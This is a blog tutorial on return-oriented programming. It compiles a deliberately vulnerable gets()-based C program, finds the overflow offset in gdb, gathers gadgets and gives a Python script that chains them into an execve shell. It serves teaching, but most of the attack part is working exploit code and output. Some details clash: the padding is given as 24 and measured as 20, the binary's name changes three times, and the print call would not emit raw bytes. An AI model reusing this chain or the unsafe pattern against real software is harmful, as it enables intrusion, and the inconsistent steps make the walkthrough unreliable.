---
title: "Exploitation of a ROP vulnerability"
description: rop.jpg
tags: ["In this article I present to you how to exploit a vulnerability of type ROP (Return-oriented programming) makes it possible to bypass mechanisms notably the ASLR and the NX system."]
---

![forthebadge made-with-python](https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif)

How are you ? After a long absence, I decide to come back for an article on `pwn`, more specifically on the exploitation of a` ROP` (Return-oriented programming) vulnerability.

Are you interested ? So LET'S GO!

Prerequisite:
- Have the basics in `pwn` to understand and how to attack a basic buffer overflow.
- And a computer, eh eh!

# Explication du système ROP

Before you start operating, you have to understand what this system is for and understand how it works.

`ROP`, return-oriented programming, is an advanced operating technique of stack overflow type allowing code execution by an attacker and this more or less effectively bypassing protection mechanisms such as only the use of non-executable memory areas (cf. bit NX for Data Execution Prevention, DEP), the use of a random address space (Address Space Layout Randomization, `ASLR`).

Our concrete goal is to retrieve instructions from the binary and then make an instruction gathering (the instruction bits are called a `gadget` this is the language used when we use ROP). Imagine that we have basic instructions. (This is an example of course)

    push   ebp                # Instruction 1
    mov    ebp,esp            # Instruction 2
    push   ecx                # Instruction 3
    sub    esp,0x4            # Instruction 4
    call   0x804848b <secret> # Instruction 5 
    mov    eax,0x0            # Instruction 6

Imagine that afterwards, we decide to take the instructions we are interested in and then do an instruction gathering, for example.

    push   ebp                # Instruction 1
    mov    ebp,esp            # Instruction 2
    mov    eax,0x0            # Instruction 6

Precisely, our goal is to recover the instructions of the binary to then modify the behavior of the program and to execute some things which interests us for example a `SHELL`, yes!

So, rest assured, I'm going to give you a little demonstration, so don't panic.

# Fonctionnement de l'ASLR

Address space layout randomization (ASLR) is a technique for randomly placing data areas in virtual memory. This is usually the position of the heap, the stack, and the libraries. This process makes it possible to limit the effects of attacks of the buffer overflow type for example.

![forthebadge made-with-python](https://raw.githubusercontent.com/0xEX75/0xEX75.github.io/master/Capture%20du%202020-01-12%2009-28-41.png)

To be more precise, basic when the `ASLR` is activated, the (basic) addresses do not move, it is that there is an` OFFSET` system which will simply generate an `OFFSET` each time program execution, which causes the addresses to change during execution, which can complicate the operation of a buffer overflow.

# Le programme et la compilation

So before all that, we will activate the `ASLR` (for roughly randomized the stack, the heap and also the libc) using a command.

    root@0xEX75:~/rop# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

And here is the C program that we will use later.

    #include <stdio.h>
    #include <stdlib.h>

    void function_vulnerability()
    {
            char buffer[8];
            gets(buffer);
            printf("%s\n", buffer);
    }

    int main(int argc, char **argv)
    {
            function_vulnerability();
            return 0;
    }

The command for the compilation of the program (I will explain the options anyway), so concretely the `-m32` option allows you to compile the program with 32 bits as its name suggests.

`-static` This option roughly allows you to integrate dynamic libraries into our binary to have a much larger file. Why ? If we have a much larger file, we will have much more instruction to put. Eh yes !

And finally the `-fno-stack-protector` option allows you to deactivate the Canary (we will need to deactivate it to perform our buffer overflow attack, but it is very possible to bypass this" security ").

    root@0xEX75:~/rop# gcc -m32 -static -fno-stack-protector vuln.c -o rop

Perfect, our program is ready to use.

# Exploitation du programme

Things are starting to get interesting, we will try to find the `padding` to overwrite the` Return Address Overwrite` or the `return address` (or save` EIP`).

We will create a small pattern to find the padding using a tool that you can install quickly [here] (https://github.com/Svenito/exploit-pattern) and then launch the command right here below.

    root@0xEX75:~/rop# pattern create 100
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    
And run `gdb` (GNU Debugger), and then send the bytes to the program to find the right` padding`. There are obviously other techniques to find the padding but it is the funniest technique in my opinion and simpler aha.

    root@0xEX75:~/rop# gdb -q rop
    Reading symbols from rop...(no debugging symbols found)...done.
    gdb-peda$ r <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    Program received signal SIGSEGV, Segmentation fault.                                                                                                                            
    [----------------------------------registers-----------------------------------]                                                                                                
    EAX: 0x65 ('e')
    EBX: 0x80481a8 (<_init>:        push   ebx)
    ECX: 0xffffffff 
    EDX: 0x80ec4d4 --> 0x0 
    ESI: 0x80eb00c --> 0x80642f0 (<__strcpy_ssse3>: mov    edx,DWORD PTR [esp+0x4])
    EDI: 0x0 
    EBP: 0x61413561 ('a5Aa')
    ESP: 0xffffd540 ("Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    EIP: 0x37614136 ('6Aa7')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x37614136
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd540 ("Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0004| 0xffffd544 ("a9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0008| 0xffffd548 ("0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0012| 0xffffd54c ("Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0016| 0xffffd550 ("b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0020| 0xffffd554 ("4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0024| 0xffffd558 ("Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0028| 0xffffd55c ("b7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x37614136 in ?? ()
    gdb-peda$

Thereafter, we will again use the program to find for good the `padding`, so according to the program we will need` 24` bytes to overwrite the backup `EIP` therefore the return address.

    root@0xEX75:~/rop# pattern offset 0x37614136 100
    20

As at the beginning of the article, our goal is to pop a shell even if the `ASLR` is open and also the` NX` system, for that we have to find a function which makes it possible to execute a command for example.

Here is a good list of functions that we can apply for the exploitation of our program [HERE] (https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html) of course we will be interested to function number `11` so the function` sys_execve () `to execute a command for example, in our case / bin / sh.

![forthebadge made-with-python](https://raw.githubusercontent.com/0xEX75/0xEX75.github.io/master/Capture%20du%202020-01-11%2015-36-29.png)

Our goal, concretely, is to pop values ​​in the registers, these are registers that we can use (`GPRs` registers for general use, because there are registers reserved in particular` EIP` and `ESP`).

So our goal is to put the value `11` in the` EAX` register and then put the parameters so for example `/ bin / sh` as argument in the` EBX` register, which will give `sys_execve (" / bin / sh ")` and since the `execve` function takes 3 parameters in particular, we will put` NULL` for `ECX` which will give` sys_execve ("/ bin / sh", NULL) `and finally put so the value `NULL` in the register` EDX` which will give `sys_execve (" / bin / sh ", NULL, NULL)`.

We already have an idea to attack the program in question, we will use a program to find the instructions, I very regularly use the `ROPGadget` tool or` rp-lin-x64` (You can install it just [HERE] (https://github.com/0vercl0k/rp/releases)).

I much prefer to use the `rp-lin-x64` tool, subjectively much more powerful and faster unlike` ROPGadget`.

We will try to find a `gadget` that will allow us to` pop` a value in the `EAX` register for the name of the function.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop eax"
    0x080d2f8e: pop eax ; call dword [edi+0x4656EE7E] ;  (1 found)
    0x0809d162: pop eax ; jmp dword [eax] ;  (4 found)
    0x080b8c96: pop eax ; ret  ;  (1 found)
    0x0804c35d: pop eax ; retn 0x080E ;  (4 found)
    0x080a712c: pop eax ; retn 0xFFFF ;  (1 found)

This one `0x080b8c96: pop eax; ret; (1 found) `is not bad at all, note that in a corner, precise, because later, we will need the address in our` Python` script.

Then let's look for an instruction that will allow us to put the first parameter in the function. Let's use the tool again.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop ebx"
    0x08050603: pop ebx ; jmp eax ;  (6 found)
    0x0804d057: pop ebx ; rep ret  ;  (1 found)
    0x080481c9: pop ebx ; ret  ;  (178 found)
    0x080d407c: pop ebx ; retn 0x06F9 ;  (1 found)
    
This one `0x080481c9: pop ebx; ret; (178 found) `is not bad at all, note again in a corner, precise for the rest. In the register we will simply put the command to execute when calling the function.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop ecx"
    0x080df4d9: pop ecx ; ret  ;  (2 found)
    0x0805c503: pop ecx ; retn 0xFFFE ;  (1 found)
    
We continue to capture the instructions, so get the instruction `0x080df4d9: pop ecx; ret` that we will put `0` in the register therefore` NULL`.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop edx"
    0x0806f1eb: pop edx ; ret  ;  (2 found)

It misses a very important element, it is an instruction which will allow us to execute our instruction (or our function), the instruction is called `int 0x80`.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "int 0x80"
    0x0806cdf3: add byte [eax], al ; int 0x80 ;  (3 found)
    0x0806cdf5: int 0x80 ;  (8 found)
    0x0806f7f0: int 0x80 ; ret  ;  (1 found)
    0x0806cdf0: mov eax, 0x00000001 ; int 0x80 ;  (1 found)
    0x0807ae09: mov eax, 0x00000077 ; int 0x80 ;  (1 found)
    0x0807ae00: mov eax, 0x000000AD ; int 0x80 ;  (1 found)
    0x0806f7ef: nop  ; int 0x80 ;  (1 found)
    0x0806cdef: or byte [eax+0x00000001], bh ; int 0x80 ;  (1 found)
    0x080b79a7: push es ; int 0x80 ;  (1 found)

Before that, we will create our little bash script, which will start `/ bin / sh`, we will use` readelf` to find the symbol, each symbol being separated by a null-byte character.

    root@0xEX75:~/rop# readelf -x .rodata ./ropme | less
    0x080bc560 64656376 745f7061 72746961 6c000000 decvt_partial...
    0x080bc570 5f494f5f 7766696c 655f756e 64657266 _IO_wfile_underf
    0x080bc580 6c6f7700 00000000 00000000 00000000 low............. # LÀ !
    0x080bc590 00000000 00000000 00000000 00000000 ................

    root@0xEX75:~/rop# echo "/bin/sh" > low
    root@0xEX75:~/rop# chmod +x low
    root@0xEX75:~/rop# export PATH=:$PATH

We are ready now for the creation of our program for `pop` the shell, the script is not very complicated, so do not panic.

    #coding:utf-8

    import sys
    import struct

    class rop_exploit(object):
            def __init__(self, padding=20):
                    self.padding = padding

            def rop_gadgets(self):
                    rop_gadget = [
                            struct.pack('<L', 0x080b8c96), # pop eax; ret
                            struct.pack('<L', 0x0000000b), # eax (11)
                            struct.pack('<L', 0x080df4d9), # pop ecx ; ret
                            struct.pack('<L', 0x00000000), # add 0
                            struct.pack('<L', 0x080481c9), # pop ebx ; ret
                            struct.pack('<L', 0x080bc580), # program 'low'
                            struct.pack('<L', 0x0806f1eb), # pop edx; ret
                            struct.pack('<L', 0x00000000), # add 0
                            struct.pack('<L', 0x0806cdf5), # int 0x80, call function
                    ]

                    print(b'A' * self.padding + b''.join(rop_gadget))

    if __name__ == "__main__":
            p = rop_exploit()
            p.rop_gadgets()

So if now we launch the program with the other binary 'program'.

    root@0xEX75:~/rop# python exploit.py|./buf 
    AAAAAAAAAAAAAAAAAAAA

    # id
    uid=0(root) gid=0(root) groupes=0(root)

AND BINGO, we managed to pop the shell, when the binary was not planned base.

CONCLUSION
----
Here we are, we finally come to the end of this article which, I hope, will have you more. I try to explain to you how the ROP system works and how to operate using ROP, do not hesitate to contact me on social networks, I am always available to answer you.
